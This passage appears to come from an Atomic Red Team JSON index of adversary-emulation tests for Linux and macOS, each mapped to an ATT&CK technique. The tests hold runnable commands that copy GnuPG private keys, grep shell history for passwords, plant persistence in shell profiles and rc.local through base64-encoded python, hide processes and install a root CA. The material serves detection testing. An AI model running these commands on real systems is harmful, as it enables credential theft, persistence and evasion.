    "attack_technique": "T1552.004",
    "display_name": "Unsecured Credentials: Private Keys",
    "source_file": "T1552.004.yaml",
    "test_name": "Copy the users GnuPG directory with rsync",
    "test_guid": "2a5a0601-f5fb-4e2e-aa09-73282ae6afca",
    "description": "Creates a staging folder /tmp/GnuPG and copies the user's GnuPG (.gnupg) directory to it using the `rsync` command.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\nexit 0\n",
      "cleanup_command": "rm -rf #{output_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "search_path": {
        "description": "Path where to start searching from",
        "type": "path",
        "default": "/"
      },
      "output_folder": {
        "description": "Output folder containing a copy of the .gnupg directory",
        "type": "path",
        "default": "/tmp/GnuPG"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
    "indexed_technique": "T1552.004.04",
    "technique_index": 4,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1546.004",
    "display_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
    "source_file": "T1546.004.yaml",
    "test_name": "Add command to .bash_profile",
    "test_guid": "94500ae1-7e31-47e3-886b-c328da46872f",
    "description": "Adds a command (echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004) to the .bash_profile file of the current user\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "echo '#{command_to_add}' >> ~/.bash_profile\n",
      "cleanup_command": "head -n '-2' ~/.bash_profile > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bash_profile\n",
      "name": "sh"
    },
    "input_arguments": {
      "command_to_add": {
        "description": "Command to add to the .bash_profile file",
        "type": "string",
        "default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Adds a command to the .bash_profile file of the current user\n",
    "indexed_technique": "T1546.004.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1546.004",
    "display_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
    "source_file": "T1546.004.yaml",
    "test_name": "Add command to .bashrc",
    "test_guid": "0a898315-4cfa-4007-bafe-33a4646d115f",
    "description": "Adds a command (echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004) to the .bashrc file of the current user\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "echo '#{command_to_add}' >> ~/.bashrc\n",
      "cleanup_command": "head -n '-2' ~/.bashrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bashrc\n",
      "name": "sh"
    },
    "input_arguments": {
      "command_to_add": {
        "description": "Command to add to the .bashrc file",
        "type": "string",
        "default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Adds a command to the .bashrc file of the current user\n",
    "indexed_technique": "T1546.004.02",
    "technique_index": 2,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1546.004",
    "display_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
    "source_file": "T1546.004.yaml",
    "test_name": "Add command to .shrc",
    "test_guid": "41502021-591a-4649-8b6e-83c9192aff53",
    "description": "Adds a command (echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004) to the .shrc file of the current user\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "echo '#{command_to_add}' >> ~/.shrc\n",
      "cleanup_command": "head -n '-2' ~/.shrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.shrc\n",
      "name": "sh"
    },
    "input_arguments": {
      "command_to_add": {
        "description": "Command to add to the .shrc file",
        "type": "string",
        "default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Adds a command to the .shrc file of the current user\n",
    "indexed_technique": "T1546.004.03",
    "technique_index": 3,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1546.004",
    "display_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
    "source_file": "T1546.004.yaml",
    "test_name": "Append to the system shell profile",
    "test_guid": "694b3cc8-6a78-4d35-9e74-0123d009e94b",
    "description": "Appends a command (echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004) to the /etc/profile file of the current user\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "name": "sh",
      "command": "echo '#{text_to_append}' >> /etc/profile\n",
      "cleanup_command": "sed -i \"s/# Atomic Red Team was here! T1546.004//\" /etc/profile\n"
    },
    "input_arguments": {
      "text_to_append": {
        "description": "Text to append to the /etc/profile file",
        "type": "string",
        "default": "# Hello from Atomic Red Team T1546.004"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time \"any\" user logs in.\n",
    "indexed_technique": "T1546.004.04",
    "technique_index": 4,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1546.004",
    "display_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
    "source_file": "T1546.004.yaml",
    "test_name": "Append commands user shell profile",
    "test_guid": "bbdb06bc-bab6-4f5b-8232-ba3fbed51d77",
    "description": "Appends a command (# Atomic Red Team was here... T1546.004) to the ~/.profile file of the current user\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": false,
      "name": "sh",
      "command": "echo '#{text_to_append}' >> ~/.profile\n",
      "cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" ~/.profile\n"
    },
    "input_arguments": {
      "text_to_append": {
        "description": "Text to append to the ~/.profile file",
        "type": "string",
        "default": "# Atomic Red Team was here... T1546.004"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the \"user\" logs in.\n",
    "indexed_technique": "T1546.004.05",
    "technique_index": 5,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1546.004",
    "display_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
    "source_file": "T1546.004.yaml",
    "test_name": "System shell profile scripts",
    "test_guid": "8fe2ccfd-f079-4c03-b1a9-bd9b362b67d4",
    "description": "Appends a text (# Atomic Red Team was here... T1546.004) to the /etc/profile.d/bash_completion.sh file of the current user\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "name": "sh",
      "command": "echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh\n",
      "cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" /etc/profile.d/bash_completion.sh\n"
    },
    "input_arguments": {
      "text_to_append": {
        "description": "Text to append to the /etc/profile.d/bash_completion.sh file",
        "type": "string",
        "default": "# Atomic Red Team was here... T1546.004"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n",
    "indexed_technique": "T1546.004.06",
    "technique_index": 6,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1546.004",
    "display_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
    "source_file": "T1546.004.yaml",
    "test_name": "Create/Append to .bash_logout",
    "test_guid": "37ad2f24-7c53-4a50-92da-427a4ad13f58",
    "description": "Creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "useradd --create-home --shell /bin/bash art\nsu -l art -c \"echo 'echo \\\"Atomic Red Team was here... T1546.004\\\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit\"\n",
      "cleanup_command": "userdel -fr art\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "The Bash shell runs ~/.bash_logout \"if it exists\" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an \"interactive login shell session\" i.e. via the console, SSH, /bin/bash -l or su -l <username>. \n\nThis test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n",
    "indexed_technique": "T1546.004.07",
    "technique_index": 7,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1036.003",
    "display_name": "Masquerading: Rename System Utilities",
    "source_file": "T1036.003.yaml",
    "test_name": "Masquerading as FreeBSD or Linux crond process.",
    "test_guid": "a315bfff-7a98-403b-b442-2ea1b255e556",
    "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n",
      "cleanup_command": "rm /tmp/crond\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n",
    "indexed_technique": "T1036.003.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1049",
    "display_name": "System Network Connections Discovery",
    "source_file": "T1049.yaml",
    "test_name": "System Network Connections Discovery FreeBSD, Linux & MacOS",
    "test_guid": "9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2",
    "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "netstat\nwho -a\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if netstat command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v netstat)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "echo \"Install netstat on the machine.\"; exit 1;\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
    "indexed_technique": "T1049.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "List OS Information",
    "test_guid": "cccb070c-df86-4216-a5bc-9fb60c74e27c",
    "description": "Gathers operating system and kernel information using `uname`, `uptime`, and by reading various release files (e.g., /etc/os-release), saving the output to /tmp/T1082.txt.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n",
      "cleanup_command": "rm #{output_file} 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Output file used to store the results.",
        "type": "path",
        "default": "/tmp/T1082.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify System Info\n",
    "indexed_technique": "T1082.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "Linux VM Check via Hardware",
    "test_guid": "31dad7ad-2286-4c02-ae92-274418c85fec",
    "description": "Checks for signs of virtualization by inspecting system files (e.g., in /sys/class/dmi/id) and using commands like dmidecode, lspci, and lscpu to find virtualization-related keywords.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n",
      "name": "bash"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
    "indexed_technique": "T1082.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "Linux VM Check via Kernel Modules",
    "test_guid": "8057d484-0fae-49a4-8302-4812c4f1e64e",
    "description": "Identifies virtual machine guest kernel modules using `lsmod` to check for VirtualBox and VMware modules.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
    "indexed_technique": "T1082.03",
    "technique_index": 3,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "FreeBSD VM Check via Kernel Modules",
    "test_guid": "eefe6a49-d88b-41d8-8fc2-b46822da90d3",
    "description": "Identifies virtual machine host kernel modules using `kldstat` to check for VirtualBox and VMware modules.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "kldstat | grep -i \"vmm\"\nkldstat | grep -i \"vbox\"\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify virtual machine host kernel modules.\n",
    "indexed_technique": "T1082.04",
    "technique_index": 4,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "Hostname Discovery",
    "test_guid": "486e88ea-4f56-470f-9b57-3f4d73f39133",
    "description": "Displays the system hostname.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "hostname\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify system hostname for FreeBSD, Linux and macOS systems.\n",
    "indexed_technique": "T1082.05",
    "technique_index": 5,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "Environment variables discovery on freebsd, macos and linux",
    "test_guid": "fcbdd43f-f4ad-42d5-98f3-0218097e2720",
    "description": "Identify all environment variables.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "env\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
    "indexed_technique": "T1082.06",
    "technique_index": 6,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "Linux List Kernel Modules",
    "test_guid": "034fe21c-3186-49dd-8d5d-128b35f181c7",
    "description": "This test lists installed kernel modules using lsmod, kmod list, and searches for 'vmw' in /proc/modules, displaying results via stdout.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "lsmod\nkmod list\ngrep vmw /proc/modules\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n",
    "indexed_technique": "T1082.07",
    "technique_index": 7,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1082",
    "display_name": "System Information Discovery",
    "source_file": "T1082.yaml",
    "test_name": "FreeBSD List Kernel Modules",
    "test_guid": "4947897f-643a-4b75-b3f5-bed6885749f6",
    "description": "Lists loaded kernel modules using `kldstat` and filters for 'vmm'.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "kldstat\nkldstat | grep vmm\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.\n",
    "indexed_technique": "T1082.08",
    "technique_index": 8,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1036.004",
    "display_name": "Masquerading: Masquerade Task or Service",
    "source_file": "T1036.004.yaml",
    "test_name": "linux rename /proc/pid/comm using prctl",
    "test_guid": "f0e3aaea-5cd9-4db6-a077-631dd19b27a8",
    "description": "Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to \"totally_legit\".  This will show up as process name in simple 'ps' listings.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "command": "#{exe_path} & ps\nTMP=`ps | grep totally_legit`\nif [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi\nexit 0\n",
      "cleanup_command": "rm -f #{exe_path}\n"
    },
    "input_arguments": {
      "exe_path": {
        "description": "Output Binary Path",
        "type": "path",
        "default": "/tmp/T1036_004_prctl_rename"
      }
    },
    "dependencies": [
      {
        "description": "#{exe_path} must be exist on system.\n",
        "prereq_command": "stat #{exe_path}\n",
        "get_prereq_command": "cc -o #{exe_path} PathToAtomicsFolder/T1036.004/src/prctl_rename.c\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to \"totally_legit\".  This will show up as process name in simple 'ps' listings.\n",
    "indexed_technique": "T1036.004.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1036.004",
    "display_name": "Masquerading: Masquerade Task or Service",
    "source_file": "T1036.004.yaml",
    "test_name": "Hiding a malicious process with bind mounts",
    "test_guid": "ad4b73c2-d6e2-4d8b-9868-4c6f55906e01",
    "description": "This test creates an infinite loop process, saves its PID to /tmp/evil_pid.txt, and hides it by bind mounting a random kernel process's /proc entry over it.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "command": "eval '(while true; do :; done) &'\necho $! > /tmp/evil_pid.txt\nrandom_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1)\nsudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)\n",
      "cleanup_command": "kill $(cat /tmp/evil_pid.txt) || echo \"Failed to kill PID $evil_pid\"\nrm /tmp/evil_pid.txt\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Creates a malicious process and hides it by bind mounting to the /proc filesystem of a benign process\n",
    "indexed_technique": "T1036.004.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1552.003",
    "display_name": "Unsecured Credentials: Bash History",
    "source_file": "T1552.003.yaml",
    "test_name": "Search Through Bash History",
    "test_guid": "3cfde62b-7c33-4b26-a61e-755d6131c8ce",
    "description": "This test searches ~/.bash_history for commands containing '-p ', 'pass', or 'ssh' and saves results to ~/loot.txt.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "~/loot.txt"
      },
      "bash_history_grep_args": {
        "description": "grep arguments that filter out specific commands we want to capture",
        "type": "path",
        "default": "-e '-p ' -e 'pass' -e 'ssh'"
      },
      "bash_history_filename": {
        "description": "Path of the bash history file to capture",
        "type": "path",
        "default": "~/.bash_history"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Search through bash history for specifice commands we want to capture\n",
    "indexed_technique": "T1552.003.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.003",
    "display_name": "Unsecured Credentials: Bash History",
    "source_file": "T1552.003.yaml",
    "test_name": "Search Through sh History",
    "test_guid": "d87d3b94-05b4-40f2-a80f-99864ffa6803",
    "description": "This test searches ~/.history for commands containing '-p ', 'pass', or 'ssh' and saves results to ~/loot.txt.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "~/loot.txt"
      },
      "sh_history_grep_args": {
        "description": "grep arguments that filter out specific commands we want to capture",
        "type": "path",
        "default": "-e '-p ' -e 'pass' -e 'ssh'"
      },
      "sh_history_filename": {
        "description": "Path of the sh history file to capture",
        "type": "path",
        "default": "~/.history"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Search through sh history for specifice commands we want to capture\n",
    "indexed_technique": "T1552.003.02",
    "technique_index": 2,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1217",
    "display_name": "Browser Bookmark Discovery",
    "source_file": "T1217.yaml",
    "test_name": "List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux",
    "test_guid": "3a41f169-a5ab-407f-9269-abafdb5da6c2",
    "description": "Searches for Mozilla Firefox's places.sqlite file that contains bookmarks and lists any found instances to /tmp/T1217-Firefox.txt.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
      "cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed.",
        "type": "path",
        "default": "/tmp/T1217-Firefox.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Searches for Mozilla Firefox's places.sqlite file (on FreeBSD or Linux distributions) that contains bookmarks and lists any found instances to a text file.\n",
    "indexed_technique": "T1217.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1217",
    "display_name": "Browser Bookmark Discovery",
    "source_file": "T1217.yaml",
    "test_name": "List Google Chromium Bookmark JSON Files on FreeBSD",
    "test_guid": "88ca025b-3040-44eb-9168-bd8af22b82fa",
    "description": "Searches for Google Chromium's Bookmark file that contains bookmarks in JSON format and lists any found instances to /tmp/T1217-Chrome.txt.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "find / -path \"*/.config/chromium/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
      "cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed.",
        "type": "path",
        "default": "/tmp/T1217-Chrome.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Searches for Google Chromium's Bookmark file (on FreeBSD) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
    "indexed_technique": "T1217.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1037.004",
    "display_name": "Boot or Logon Initialization Scripts: Rc.common",
    "source_file": "T1037.004.yaml",
    "test_name": "rc.common",
    "test_guid": "c33f3d80-5f04-419b-a13a-854d1cbdbf3a",
    "description": "Modify rc.common\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common\nsudo chmod +x /etc/rc.common\n",
      "cleanup_command": "origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Modify rc.common\n",
    "indexed_technique": "T1037.004.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1037.004",
    "display_name": "Boot or Logon Initialization Scripts: Rc.common",
    "source_file": "T1037.004.yaml",
    "test_name": "rc.local",
    "test_guid": "126f71af-e1c9-405c-94ef-26a47b16c102",
    "description": "Modify rc.local\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\n[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local\necho \"\\npython3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local\nprintf 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n",
      "cleanup_command": "origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Modify rc.local\n",
    "indexed_technique": "T1037.004.02",
    "technique_index": 2,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1553.004",
    "display_name": "Subvert Trust Controls: Install Root Certificate",
    "source_file": "T1553.004.yaml",
    "test_name": "Install root CA on CentOS/RHEL",
    "test_guid": "9c096ec4-fd42-419d-a762-d64cc950627e",
    "description": "Generates a self-signed certificate `rootCA.crt`, installs it by copying to `/etc/pki/ca-trust/source/anchors/`, and updates the system's CA trust store.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n",
      "cleanup_command": "rm /etc/pki/ca-trust/source/anchors/#{cert_filename}\nupdate-ca-trust\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "cert_filename": {
        "description": "Path of the CA certificate we create",
        "type": "path",
        "default": "rootCA.crt"
      },
      "key_filename": {
        "description": "Key we create that is used to create the CA certificate",
        "type": "path",
        "default": "rootCA.key"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Creates a root CA with openssl\n",
    "indexed_technique": "T1553.004.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1553.004",
    "display_name": "Subvert Trust Controls: Install Root Certificate",
    "source_file": "T1553.004.yaml",
    "test_name": "Install root CA on FreeBSD",
    "test_guid": "f4568003-1438-44ab-a234-b3252ea7e7a3",
    "description": "Creates a root CA with openssl\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
